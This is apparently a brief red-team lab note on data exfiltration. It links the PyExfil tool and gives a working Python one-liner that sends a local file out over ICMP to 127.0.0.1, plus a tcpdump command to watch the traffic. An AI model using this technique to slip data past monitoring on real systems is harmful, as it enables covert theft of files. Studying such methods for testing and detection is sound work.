# Stego Red Team

## Data Exfiltration

* PyExfil: https://github.com/ytisf/PyExfil

`python -c 'from pyexfil.network.ICMP.icmp_exfiltration import send_file;ip_addr = "127.0.0.1";send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="/home/kali/stego/PyExfil/1.txt", max_packetsize=512, SLEEP=0.1)'`

`tcpdump -A icmp -i lo`
